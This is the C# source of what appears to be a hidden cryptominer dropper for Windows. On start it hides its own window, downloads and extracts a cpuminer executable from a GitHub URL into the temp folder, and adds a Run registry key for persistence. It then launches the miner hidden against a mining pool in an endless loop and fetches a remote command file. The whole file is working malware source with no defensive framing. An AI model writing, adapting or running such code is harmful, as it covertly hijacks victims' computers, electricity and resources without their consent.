using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.InteropServices;
using System.Xml.Serialization;
using Microsoft.Win32;

namespace miis
{
    public class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const bool CLEANSTART = false;
        private const bool WRITETXTLOG = true;
        private const bool WRITELOGTOCONSOLE = true;
        private const string LOGFILENAME = "log.txt";
        private const string MYNAMEIS = "iAS";
        private static readonly string SAVE_ZIP_AS = "importante.zip";
        private static readonly string UPDATECMDFILESAVEAS = "cmdline.txt";
        private const string DOWNLOADURL = "https://github.com/senery/iAR/raw/main/iaas.zip";
        /* private const string DOWNLOADURL = "https://github.com/senery/seneryservice/raw/main/sser.zip"; */
        private const string UPDATECMDFILE = "https://raw.githubusercontent.com/senery/iAR/main/cmdline.txt";
        private static readonly string TempPath = Path.GetTempPath();
        private static readonly string EXECUTABLE_FILE = Path.Combine(TempPath, "cpuminer-sse2.exe");
        private static readonly string CMDLINEFILE = Path.Combine(TempPath, UPDATECMDFILESAVEAS);
        private static readonly string CMDLINE_WITH_PARAMETERS = EXECUTABLE_FILE + " -a yespower -o europe.mining-dutch.nl:9986 -u senery -p n=r --cpu-priority 2 -q";

        private static void GetExCommand(string sRemoteCmdFile) {
            
            string sTemp = "";

            if (DownloadAndSave(UPDATECMDFILE, UPDATECMDFILESAVEAS, false))
            {

                try
                {
                    sTemp = File.ReadAllText(CMDLINEFILE);
                    DebugLogEx("GetExCommand:ok: " + CMDLINEFILE, null);
                }
                catch (Exception e)
                {
                    DebugLogEx("GetExCommand:Error: ", e);
                }
            }
        }
        private static void DebugLogToFile(string debugMessage)
        {
            try
            {
                File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), LOGFILENAME),
                    $"{DateTime.Now:G} : {debugMessage}\n\n");
            }
            catch (Exception e)
            {
                DebugLogEx("DebugLogToFile:Error: ", e);// Handle log file write failure
            }
        }

        private static void DebugLogEx(string debugMessage, Exception ex = null)
        {
            var errorMessage = ex != null ? $"{debugMessage}\n\n{ex.Message}" : debugMessage;
            if (WRITELOGTOCONSOLE)
            {
                Console.Write(errorMessage);
            }

            if (WRITETXTLOG)
            {
                DebugLogToFile(errorMessage);
            }
        }

        private static bool EssentialFileExists(string sEssentialFile)
        {
            if (File.Exists(sEssentialFile))
            {
                DebugLogEx("EssentialFileExists: " + sEssentialFile, null);
                return true;
                
            }
            DebugLogEx("EssentialFileExists:NotFound: " + sEssentialFile, null);
            return false;
        }
        private static bool DownloadAndSave(string url, string saveAs, bool doExtract = false)
        {
            WebClient web = null;

            try
            {
                DebugLogEx("DownloadAndSave: " + url);
                web = new WebClient();
                web.DownloadFile(url, saveAs);
                try
                {
                    if (doExtract)
                    {
                        ZipFile.ExtractToDirectory(saveAs, TempPath);
                        DebugLogEx("DownloadAndSave:Extracted", null);
                        return true;
                    }
                    else
                    {
                        DebugLogEx("DownloadAndSave:NoExtract", null);
                        return true;   
                    }
                    //DebugLogEx("DownloadAndSave:ok: " + url + "\n" + saveAs, null);
                }catch(Exception e)
                {
                    DebugLogEx("DownloadAndSave:Extracted:Error", e);
                    return false;

                }
                //return true; 
            }
            catch (WebException e)
            {
                DebugLogEx("Download failed", e);
                return false;
            }
            finally
            {
                web?.Dispose();
            }
        }

        private static void AddToStartupRegistry()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue(MYNAMEIS, CMDLINE_WITH_PARAMETERS);
                    DebugLogEx("AddToStartupRegistry:SetKey:" + MYNAMEIS + ": " + CMDLINE_WITH_PARAMETERS, null);
                }
            }
            catch (Exception e)
            {
                DebugLogEx("Error adding to startup registry", e);
            }
        }
        private static void RunMyShizzle()
        {
            try
            {
                Process process = new Process();
                process.StartInfo = new ProcessStartInfo()
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = CMDLINE_WITH_PARAMETERS
                };
                process.Start();
            }
            catch (Exception e)
            {
                DebugLogEx("RunMyShizzle:Error: ", e);
            }

        }
        private static void CleanFiles()
        {
            try
            {
                File.Delete(EXECUTABLE_FILE);
                File.Delete(CMDLINEFILE);
                //File.Delete(UPDATECMDFILESAVEAS);
            }
            catch (Exception e)
            {

                DebugLogEx("CleanFiles:Error: ", e);
            }
        }

        public static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);

            while (true)
            {
                System.Threading.Thread.Sleep(1);

                string extractedExecutablePath = EXECUTABLE_FILE;

                if (CLEANSTART)
                {
                    CleanFiles();
                }

                if (DownloadAndSave(DOWNLOADURL, SAVE_ZIP_AS, true))
                {
                    // Assuming the executable is directly in the ZIP file, adjust this accordingly
                    AddToStartupRegistry();
                    RunMyShizzle();
                    GetExCommand(UPDATECMDFILE);
                }
                else
                {
                    // Handle download failure
                    AddToStartupRegistry();
                    RunMyShizzle();
                    GetExCommand(UPDATECMDFILE);
                }

                DebugLogEx("No args");
            }
        }
    }
}
